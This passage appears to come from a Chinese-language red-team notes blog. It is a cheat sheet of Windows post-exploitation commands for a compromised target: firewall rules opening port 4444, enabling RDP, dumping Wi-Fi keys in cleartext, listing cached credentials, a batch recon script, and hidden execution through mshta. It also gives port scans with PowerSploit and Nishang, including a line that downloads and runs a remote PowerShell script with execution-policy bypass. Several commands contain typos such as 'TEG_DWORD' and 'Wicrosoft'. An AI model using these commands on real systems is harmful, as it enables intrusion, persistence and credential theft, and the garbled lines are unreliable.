firewall <span class="keyword">add</span> rule name<span class="operator">=</span>&quot;RemoteDesktop&quot; protocol<span class="operator">=</span>TCP dir<span class="operator">=</span><span class="keyword">in</span> localport<span class="operator">=</span><span class="number">3389</span> action<span class="operator">=</span>allow</span><br></pre></td></tr></table></figure><p><img src="https://yxr37qkcj7k.feishu.cn/space/api/box/stream/download/asynccode/?code=NWE4NmY1NzE2OTYzNDhiMzUwODUyODViY2FmMWIzNjNfYndSQ3o1N0NWS3plN1lWNEtreVlNNTc5M1o5dUh4c09fVG9rZW46UmVXc2Joejc4b0NtOVp4eU9ZdWMwU1pBbjJmXzE3MjA1NjU2MzA6MTcyMDU2OTIzMF9WNA" alt="img"></p><p>允许端口进站</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>test dir<span class="operator">=</span><span class="keyword">in</span> action<span class="operator">=</span>allow protocol<span class="operator">=</span>tcp localport<span class="operator">=</span><span class="number">4444</span>#允许端口进站</span><br></pre></td></tr></table></figure><p>允许端口出站</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>test dir<span class="operator">=</span><span class="keyword">out</span> action<span class="operator">=</span>allow protocol<span class="operator">=</span>tcp localport<span class="operator">=</span><span class="number">4444</span>#允许端口进站</span><br></pre></td></tr></table></figure><p>允许程序入站</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall <span class="keyword">add</span> rule name<span class="operator">=</span>test dir<span class="operator">=</span><span class="keyword">in</span> action<span class="operator">=</span>allow program<span class="operator">=</span>c:<span class="operator">/</span><span class="operator">/</span>a.exe</span><br></pre></td></tr></table></figure><p>出站类似</p><p>开启远程服务</p><p>在2003机器上</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting <span class="keyword">where</span> (_CLASS <span class="operator">!=</span>&quot;&quot;) <span class="keyword">call</span> setallowtsconnections <span class="number">1</span></span><br></pre></td></tr></table></figure><p>在server2008和server 2021</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG <span class="keyword">ADD</span> HKLM\<span class="keyword">SYSTEM</span>\CurrentControlSet\Control\Terminal&quot; &quot;Server <span class="operator">/</span>v fDenyTSConnections <span class="operator">/</span>t TEG_DWORD <span class="operator">/</span>d <span class="number">00000000</span> <span class="operator">/</span>f</span><br><span class="line">REG <span class="keyword">ADD</span> HKLM\<span class="keyword">SYSTEM</span>\CurrentControlSet\Control\Terminal&quot; &quot;Server <span class="operator">/</span>v fDenyTSConnections <span class="operator">/</span>t TEG_DWORD <span class="operator">/</span>d <span class="number">11111111</span> <span class="operator">/</span>f</span><br></pre></td></tr></table></figure><p>查wifi密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>f &quot;skip=9 tokens=1,2 delims=:&quot; <span class="operator">%</span>i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>) do <span class="variable">@echo</span> <span class="operator">%</span>j <span class="operator">|</span> findstr <span class="operator">-</span>i <span class="operator">-</span>v echo <span class="operator">|</span> netsh wlan <span class="keyword">show</span> profiles <span class="operator">%</span>j key<span class="operator">=</span>clear</span><br></pre></td></tr></table></figure><p>查看RDP(远程桌面协议)端口号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp&quot; <span class="operator">/</span>v PortNumber</span><br></pre></td></tr></table></figure><p>查代理信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Wicrosoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><p>查看登录凭证     &#x2F;&#x2F;可能有人将管理凭证缓存，然后这里就能看到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey <span class="operator">/</span>list</span><br></pre></td></tr></table></figure><p>查看arp信息，查看地址存活</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp <span class="operator">-</span>a</span><br></pre></td></tr></table></figure><p>查看本机用户组</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><p>查看最近打开的文档</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir <span class="operator">%</span>APPDATA<span class="operator">%</span>\Microsoft\Windows\Recent</span><br></pre></td></tr></table></figure><p>查看本机用户组（windows11家庭版好像只能这么干）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><p>查看管理员组成员</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><h4 id="自动收集脚本"><a href="#自动收集脚本" class="headerlink" title="自动收集脚本"></a>自动收集脚本</h4><h3 id="bat脚本"><a href="#bat脚本" class="headerlink" title="bat脚本"></a>bat脚本</h3><p>查一些信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>f &quot;delims=&quot; <span class="operator">%</span><span class="operator">%</span>A <span class="keyword">in</span> (<span class="string">&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;</span>) do <span class="keyword">set</span> &quot;var=%%A&quot; </span><br><span class="line">wmic process <span class="keyword">get</span> CSName,Description,ExecutablePath,ProcessId <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic service <span class="keyword">get</span> Caption,Name,PathName,ServiceType,Started,StartMode,StartName <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic USERACCOUNT list <span class="keyword">full</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic <span class="keyword">group</span> list <span class="keyword">full</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic nicconfig <span class="keyword">where</span> IPEnabled<span class="operator">=</span><span class="string">&#x27;true&#x27;</span> <span class="keyword">get</span> Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic volume <span class="keyword">get</span> Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic netuse list <span class="keyword">full</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,InstalledOn <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic startup <span class="keyword">get</span> Caption,Command,Location,<span class="keyword">User</span> <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic PRODUCT <span class="keyword">get</span> Description,InstallDate,InstallLocation,PackageCache,Vendor,Version <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic os <span class="keyword">get</span> name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html </span><br><span class="line">wmic Timezone <span class="keyword">get</span> DaylightName,Description,StandardName <span class="operator">/</span>format:&quot;%var%&quot; <span class="operator">&gt;&gt;</span> out.html</span><br></pre></td></tr></table></figure><p>查本机IP范围内可连的IP</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>L <span class="operator">%</span>I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) DO <span class="variable">@ping</span> <span class="operator">-</span>w <span class="number">1</span> <span class="operator">-</span>n <span class="number">1</span> <span class="number">192.168</span><span class="number">.45</span>.<span class="operator">%</span>I <span class="operator">|</span> findstr &quot;TTL=&quot;   <span class="operator">/</span><span class="operator">/</span>中间的(<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>)，第一个是开头，<span class="number">254</span>是结尾。中间的<span class="number">1</span>是步长，可为负</span><br></pre></td></tr></table></figure><p>Tips:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo off <span class="operator">/</span><span class="operator">/</span>将后面多余的输出删去，不显示命令本身，不用一段一隔</span><br><span class="line">echo <span class="keyword">on</span> <span class="operator">/</span><span class="operator">/</span>一段一隔</span><br><span class="line">pause <span class="operator">/</span><span class="operator">/</span>暂停，卡扣</span><br><span class="line"><span class="variable">@echo</span> off <span class="operator">/</span><span class="operator">/</span>将第一行的命令输出也删掉</span><br><span class="line"><span class="keyword">call</span> C:\<span class="number">2.</span>bat  <span class="operator">/</span><span class="operator">/</span>调用(运行并回显)C盘下面<span class="number">2.</span>bat的内容</span><br><span class="line">cmd命令后台运行</span><br><span class="line"><span class="variable">@echo</span> off</span><br><span class="line">if &quot;%1&quot; <span class="operator">=</span><span class="operator">=</span> &quot;h&quot; goto <span class="keyword">begin</span></span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;%~nx0&quot;&quot; h&quot;,<span class="number">0</span>)(window.close)<span class="operator">&amp;&amp;</span>exit</span><br><span class="line">:<span class="keyword">begin</span></span><br><span class="line">REM</span><br></pre></td></tr></table></figure><p>工具kscan会好用一点</p><p>fscan -t 192.168.45.0&#x2F;24 –encoding gbk</p><p>暂时无法在飞书文档外展示此内容</p><p>另外端口扫描就是powersploit和redteamtool</p><p>powersploit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上传到靶机执行</span><br><span class="line">powershell ‐<span class="keyword">exec</span> bypass Import‐<span class="keyword">Module</span> .\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts <span class="number">192.168</span><span class="number">.41</span><span class="number">.0</span><span class="operator">/</span><span class="number">24</span> ‐T <span class="number">4</span> ‐ports <span class="string">&#x27;445,8080,3389,80&#x27;</span> ‐oA c:\<span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line">远程执行</span><br><span class="line">powershell ‐<span class="keyword">exec</span> bypass ‐c IEX (<span class="keyword">New</span>‐ObjectSystem.Net.Webclient).DownloadString(<span class="string">&#x27;http://118.178.134.226:8080/Invoke‐Portscan.ps1&#x27;</span>);import‐<span class="keyword">module</span> .\Invoke‐Portscan.ps1;Invoke‐Portscan ‐Hosts <span class="number">192.168</span><span class="number">.41</span><span class="number">.0</span><span class="operator">/</span><span class="number">24</span> ‐T <span class="number">4</span> ‐ports <span class="string">&#x27;445,8080,3389,80&#x27;</span> ‐oA c:\<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><p>Nishang</p><p>针对powershell的渗透工具，</p><p>类似的Invoke‐Portscan.ps1;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="operator">-</span>command &quot;&amp;&#123;Invoke-PortScan -StartAdress 192.168.41.1 -EndAddress 192.168.41.21 -ResolveHost&#125;&quot;</span><br><span class="line">powershell ‐command &quot;&amp; &#123; import‐module .\nishang\nishang.psm1; Invoke‐PortScan ‐StartAddress 192.168.41.1 ‐EndAddress 192.168.41.255 -Ports 445 ‐ResolveHost &#125;&quot; </span><br></pre></td></tr></table></figure><p>可以先导入模块在cs中，powershell-import +模块位置</p><p>然后直接使用就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> caosuan </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
